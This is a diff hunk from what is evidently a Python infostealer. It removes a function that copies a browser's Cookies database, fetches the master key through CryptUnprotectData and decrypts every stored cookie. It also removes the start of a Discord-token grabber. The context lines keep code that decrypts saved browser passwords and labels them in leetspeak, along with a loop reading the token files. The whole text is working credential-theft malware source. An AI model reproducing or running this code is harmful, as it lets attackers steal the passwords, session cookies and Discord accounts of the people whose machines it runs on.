@@ -466,43 +466,6 @@ def getPassw(path,arg):
                     if not old in paswWords:paswWords.append(old)
             Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
     writeforfile(Passw,'passw')
-Cookies=[]
-def getCookie(path,arg):
-    global Cookies
-    if not os.path.exists(path):return
-    pathC=path+arg+'/Cookies'
-    if os.stat(pathC).st_size==0:return
-    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'
-    shutil.copy2(pathC,tempfold)
-    conn=sql_connect(tempfold)
-    cursor=conn.cursor()
-    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
-    data=cursor.fetchall()
-    cursor.close()
-    conn.close()
-    os.remove(tempfold)
-    pathKey=path+'/Local State'
-    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())
-    master_key=b64decode(local_state['os_crypt']['encrypted_key'])
-    master_key=CryptUnprotectData(master_key[5:])
-    for row in data:
-        if row[0]!='':
-            for wa in keyword:
-                old=wa
-                if 'https' in wa:
-                    tmp=wa
-                    wa=tmp.split('[')[1].split(']')[0]
-                if wa in row[0]:
-                    if not old in cookiWords:cookiWords.append(old)
-            Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
-    writeforfile(Cookies,'cook')
-def GetDiscord(path,arg):
-    if not os.path.exists(f"{path}/Local State"):return
-    pathC=path+arg
-    pathKey=path+'/Local State'
-    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())
-    master_key=b64decode(local_state['os_crypt']['encrypted_key'])
-    master_key=CryptUnprotectData(master_key[5:])
     for file in os.listdir(pathC):
         if file.endswith('.log')or file.endswith('.ldb'):
             for line in[x.strip()for x in open(f"{pathC}\\{file}",errors='ignore').readlines()if x.strip()]:
